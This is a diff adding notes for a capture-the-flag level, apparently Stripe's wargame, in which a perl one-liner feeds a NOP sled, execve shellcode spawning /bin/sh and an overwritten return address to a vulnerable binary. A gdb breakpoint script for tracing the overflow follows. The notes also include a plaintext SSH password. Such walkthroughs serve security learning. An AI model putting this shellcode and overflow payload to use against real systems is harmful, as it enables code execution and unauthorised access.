@@ -1,0 +1,55 @@
+$ ssh level04@ctf.stri.pe
+	Password: i5cBbPvPCpcP
+
+$ objdump -S /levels/level04
+	08048400 <__do_global_dtors_aux>:
+
+$ /levels/level04 `perl -e 'print "\x90" x 1008 . "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" . "\xef\xbe\xad\xde"'`
+$ cat /home/level05/.password
+	i5cBbPvPCpcP
+$ exit
+
+$ gdb
+
+(gdb) file /levels/level04
+(gdb) set args `perl -e 'print "\x90" x 1008 . "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" . "\xef\xbe\xad\xde"'`
+
+# Just a nice way to step and get most of the output you'll be looking at.
+(gdb) define nx
+>set $counter = 0
+>while $counter < $arg0
+ >stepi
+ >info frame
+ >info registers
+ >set $counter = $counter + 1
+ >end
+>end
+
+# This helps with my tour through this exploit.
+(gdb) define tour
+>continue
+>info frame
+>info registers
+>end
+
+# main() puts the payload into eax.
+(gdb) break *0x080484cf
+(gdb) break *0x080484d7
+(gdb) commands
+>tour
+>end
+
+# fun()
+(gdb) break *0x08048484
+# strcpy() (which you'll just want to skip.)
+(gdb) break *0x0804849d
+(gdb) commands
+>tour
+>end
+# fun()'s leave right after strcpy()
+(gdb) break *0x080484a2
+
+# __do_global_dtors_aux()'s ret
+(gdb) break *0x08048454
+(gdb) run
+(gdb) nx 1
